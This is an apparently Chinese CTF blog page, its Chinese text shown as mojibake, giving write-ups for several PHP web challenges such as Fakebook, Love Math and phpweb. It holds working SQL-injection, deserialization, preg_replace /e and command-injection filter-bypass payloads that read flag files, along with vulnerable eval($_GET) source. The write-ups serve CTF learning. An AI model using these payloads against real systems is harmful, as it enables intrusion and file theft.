<p>æœ€ç»ˆpayloadä¸ºï¼š<code>?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>ï¼ŒæŸ¥çœ‹æºä»£ç å³å¯æ‹¿flag</p>
<hr>
<h4 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h4><p>ç‚¹joinï¼Œåˆ›å»ºè´¦å·ï¼Œå‘ç°ç”¨æˆ·åå¯ä»¥ç‚¹å‡»ï¼Œç‚¹å‡»åå‘ç°æ³¨å…¥ç‚¹ï¼Œsqlæ³¨å…¥</p>
<p>order by 4 # æœ‰4åˆ—</p>
<p>union select 1,2,3,4# æŠ¥é”™ï¼Œè¿‡æ»¤äº†union selectï¼Œå°±ç”¨union&#x2F;**&#x2F;select 1,2,3,4# å‘ç°2çš„ä½ç½®å›æ˜¾ï¼ŒæŸ¥åº“æŸ¥è¡¨ï¼Œå‘ç°åœ¨fakebookæ•°æ®åº“çš„usersè¡¨ä¸­çš„dataå­—æ®µæ˜¯ä¸€æ®µåºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œæƒ³åˆ°å¯ä»¥ç”¨ssrfè§£å†³ï¼Œç”¨dirsearchæ‰«æå¾—åˆ°robots.txtå’Œuser.php.bakï¼Œä¸‹è½½ä¸‹æ¥ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>


<span class="token keyword">class</span> <span class="token class-name-definition class-name">UserInfo</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"file:///var/www/html/flag.php"</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ„é€ payloadï¼š</p>
<p>?no&#x3D;-1 union&#x2F;**&#x2F;select 1,2,3,â€™O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€adminâ€;s:3:â€ageâ€;i:1;s:4:â€blogâ€;s:29:â€file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpâ€;}â€™#</p>
<p>åœ¨ç½‘é¡µæºä»£ç ä¸­å‘ç°flag</p>
<p>å¦ä¸€ç§æ–¹æ³•ï¼š</p>
<p>ä½¿ç”¨load_file()å‡½æ•°ï¼Œç›´æ¥å¾—åˆ°flagï¼Œä¸è¿‡å‰ææ˜¯çŸ¥é“flagæ–‡ä»¶ä½ç½® </p>
<p>payloadï¼š&#x2F;view.php?no&#x3D;0 union&#x2F;**&#x2F;select 1,load_file(â€˜&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpâ€™),3,4</p>
<hr>
<h4 id="WUSTCTF2020-æœ´å®æ— å"><a href="#WUSTCTF2020-æœ´å®æ— å" class="headerlink" title="[WUSTCTF2020]æœ´å®æ— å"></a>[WUSTCTF2020]æœ´å®æ— å</h4><p>æŸ¥çœ‹robots.txtå‘ç°fAke_f1agggg.phpï¼Œè®¿é—®å‘ç°æ˜¯ä¸ªå‡çš„flagï¼ŒæŠ“ä¸ªåŒ…å‘ç°&#x2F;fl4g.phpã€‚ç„¶åä»£ç å®¡è®¡ã€‚</p>
<p>ç¬¬ä¸€ä¸ªè€ƒå¯Ÿäº†intvalå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°è¿”å›æ•´æ•°ï¼Œ</p>
<p>å¦‚æœintvalå‡½æ•°å‚æ•°å¡«å…¥&#x3D;&#x3D;ç§‘å­¦è®¡æ•°æ³•&#x3D;&#x3D;çš„å­—ç¬¦ä¸²ï¼Œä¼šä»¥eå‰é¢çš„æ•°å­—ä½œä¸ºè¿”å›å€¼è€Œå¯¹äºç§‘å­¦è®¡æ•°æ³•+æ•°å­—åˆ™ä¼šè¿”å›å­—ç¬¦ä¸²ç±»å‹</p>
<p>å¡«å…¥2e4åˆ™å¯ä»¥è¦è¿‡intvalæ„é€ payloadï¼šnum&#x3D;1e10</p>
<p>ç¬¬äºŒä¸ªè€ƒå¯Ÿmd5ï¼Œç™¾åº¦ï¼Œmd5&#x3D;0e215962017</p>
<p>ç¬¬ä¸‰ä¸ªå‘½ä»¤æ³¨å…¥ï¼Œå…ˆlsï¼Œå‘ç°fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaagæ–‡ä»¶ï¼Œå†ç”¨catè¯»ï¼Œä½†æ˜¯catè¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œç”¨å¼•å·ç»•è¿‡å³å¯ï¼Œçš„flag</p>
<hr>
<h4 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11588219.html">CISCN 2019 åˆèµ›]Love Math - MustaphaMond - åšå®¢å›­ (cnblogs.com)</a></p>
<p>éœ€è¦æ„é€ è¿™ä¸ªï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å‡½æ•°åå’Œå‚æ•°éƒ½é€šè¿‡GETä¸Šä¼ ï¼Œäºæ˜¯æ¨å‡º</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œç”¨piå’Œabsæ˜¯é‡‡ç”¨ç™½åå•é‡Œé¢çš„</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å› ä¸ºä¸­æ‹¬å·ã€å¼•å·è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨å¤§æ‹¬å·ä»£æ›¿</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span>pi<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span>abs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>$_GET</code>å‡½æ•°ä¸åœ¨ç™½åå•å†…ï¼Œæƒ³åŠæ³•æ„é€ ï¼Œæœ‰ç‚¹å›°éš¾ï¼Œæ¯•ç«Ÿè¿˜è¦æ±‚å¤§å†™ï¼š<br>è¿™é‡Œç”¨<code>dechex()</code>(åè¿›åˆ¶è½¬åå…­è¿›åˆ¶)æ„é€ å‡º16è¿›åˆ¶æ•°ï¼Œå†ç”¨<code>bin2hex()</code>ç»•è¿‡</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$pi</span><span class="token operator">=</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>pi<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>abs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>pi<span class="token operator">=</span>system<span class="token operator">&amp;</span>abs<span class="token operator">=</span>tac <span class="token operator">/</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶é¹…bin2hexå¹¶ä¸åœ¨ç™½åå•é‡Œé¢ï¼Œè¿™ç©æ„è¿˜è¦æ„é€ å‡ºæ¥ï¼Œç”¨base_convert()æ„é€ ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$pi</span><span class="token operator">=</span><span class="token function">base_convert</span><span class="token punctuation">(</span><span class="token number">37907361743</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token number">1598506324</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">&#123;</span>pi<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$$pi</span><span class="token punctuation">&#123;</span>abs<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>pi<span class="token operator">=</span>system<span class="token operator">&amp;</span>abs<span class="token operator">=</span>c<span class="token string single-quoted-string">'a'</span>t <span class="token operator">/</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ‹¿åˆ°flag</p>
<hr>
<h4 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h4><p>&#x3D;&#x3D;æ–‡ä»¶åŒ…å«ï¼Œå‘½ä»¤æ‰§è¡Œ&#x3D;&#x3D;</p>
<p>å¼€å¤´å’Œ<code>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</code>å¾ˆåƒï¼Œç„¶åæ‹¿åˆ°next.phpæºç ï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>        
        <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span>
        <span class="token variable">$str</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™é‡Œæ¶‰åŠ<code>preg_replace \e</code>çš„æ¼æ´ã€‚å‚è€ƒé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2557">æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
<p>æ„é€ payloadï¼š&#x2F;next.php?\S*&#x3D;{${getFlag()}}&amp;cmd&#x3D;system(â€˜cat &#x2F;flagâ€™);</p>
<hr>
<h4 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</h4><p>é¡µé¢ä¸€ç›´åˆ·æ–°æŠ“åŒ…çœ‹çœ‹ï¼Œå‘ç°postä¸Šä¼ äº†ä¸¤ä¸ªå‚æ•°ï¼Œ<code>func=date&amp;p=Y-m-d+h%3Ai%3As+a</code></p>
<p>çŒœæµ‹funcæ˜¯å‡½æ•°å,pæ˜¯å‚æ•°ã€‚<code>func=system&amp;p=ls</code>è¿”å›heck!!</p>
<p>åº”è¯¥æ˜¯è¿‡æ»¤äº†systemï¼Œç„¶åä½¿ç”¨file_get_contentsè¯»å–æºç </p>
<p><code>func=file_get_contents&amp;p=index.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$disable_fun</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"passthru"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_open"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"show_source"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"popen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"dl"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"eval"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"touch"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"assert"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"substr_replace"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_filter"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"array_map"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"filter_var"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uasort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uksort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_reduce"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fopen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fwrite"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é»‘åå•</span>
    <span class="token keyword">function</span> <span class="token function-definition function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Y-m-d h:i:s a"</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"date"</span><span class="token punctuation">;</span>
        <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$func</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$disable_fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ï¼Œå°è¯•ååºåˆ—åŒ–ã€‚expï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"cd /../../tmp;cat flagoefiu4r93"</span><span class="token punctuation">;</span><span class="token comment">//æ›´æ”¹$pçš„å€¼ï¼ŒæŸ¥æ–‡ä»¶</span>
    <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœ€ç»ˆpayloadï¼š</p>
<p><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:31:&quot;cd /../../tmp;cat flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></p>
<hr>
<h4 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="*[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>*[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h4><p>ä¸‹è½½æ–‡ä»¶åå‘ç°æœ‰å¾ˆå¤šphpæ–‡ä»¶ï¼Œæœ¬é¢˜ç›®è€ƒæŸ¥çš„æ˜¯ç¼–å†™<code>è„šæœ¬</code>çš„èƒ½åŠ›ï¼Œæ‰¾å‡ºå­˜åœ¨å¯ç”¨shellçš„phpæ–‡ä»¶ã€‚</p>
<p>å‚è€ƒé“¾æ¥ï¼š[(40æ¡æ¶ˆæ¯) <a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/115256974">å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢_Sk1yçš„åšå®¢-CSDNåšå®¢</a></p>
<hr>
<h4 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="*[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>*[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h4><p>gitæ³„éœ²ï¼Œgithackæ‰«åˆ°index.phpæ–‡ä»¶</p>
<p>index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br>"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// echo $_GET['exp'];</span>
                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// highlight_file(__FILE__);</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç¬¬äºŒä¸ªifè¯­å¥è¡¨ç¤ºæˆ‘ä»¬ä¸èƒ½ä¼ å‚ä¼ªåè®®ï¼Œç¬¬ä¸‰ä¸ªifè¯­å¥çš„æ­£åˆ™åŒ¹é…æ¶‰åŠ<code>é€’å½’æ¨¡å¼</code>å’Œ<code>æ— å‚æ•°å‡½æ•°çš„æ ¡éªŒ</code>ï¼Œå‚è€ƒé“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE Â· skyâ€™s blog (skysec.top)</a></p>
